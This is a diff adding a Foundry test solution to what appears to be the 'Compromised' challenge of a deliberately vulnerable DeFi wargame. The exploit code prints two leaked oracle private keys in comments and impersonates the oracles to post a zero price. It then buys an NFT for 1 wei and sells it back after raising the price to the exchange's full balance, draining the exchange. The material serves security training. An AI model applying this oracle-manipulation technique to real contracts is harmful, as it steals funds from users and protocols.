@@ -74,9 +74,46 @@ contract Compromised is Test {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
+    // forge test --match-contract Compromised
     function testExploit() public {
         /** EXPLOIT START **/
-
+        // the strange response from the server is in hex.
+        // we have to decode the hex like:
+        // hex => ASCII => base64 => ASCII
+        // we get two private keys after decoding.
+        // key1 = 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+        // key2 = 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+        address oracle1 = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15; // source 1
+        address oracle2 = 0x81A5D6E50C214044bE44cA0CB057fe119097850c; // source 2
+        // since we already have the private keys of two oracles,
+        // we assume ownership of the oracles using vm.prank;
+        // we set the price of the nft to 0 for both oracles
+        vm.prank(oracle1);
+        trustfulOracle.postPrice("DVNFT", 0);
+        // second oracle
+        vm.prank(oracle2);
+        trustfulOracle.postPrice("DVNFT", 0);
+        // buy an nft
+        vm.prank(attacker);
+        // value 1 to pass the > 0 check.
+        exchange.buyOne{value: 1}();
+        // change the prices to the exchanges total balance
+        vm.prank(oracle1);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        // second oracle
+        vm.prank(oracle2);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        // sell the nft
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), 0);
+        exchange.sellOne(0);
+        vm.stopPrank();
+        // change the prices back to the initial nft price.
+        vm.prank(oracle1);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        // second oracle
+        vm.prank(oracle2);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
         /** EXPLOIT END **/
         validation();
     }
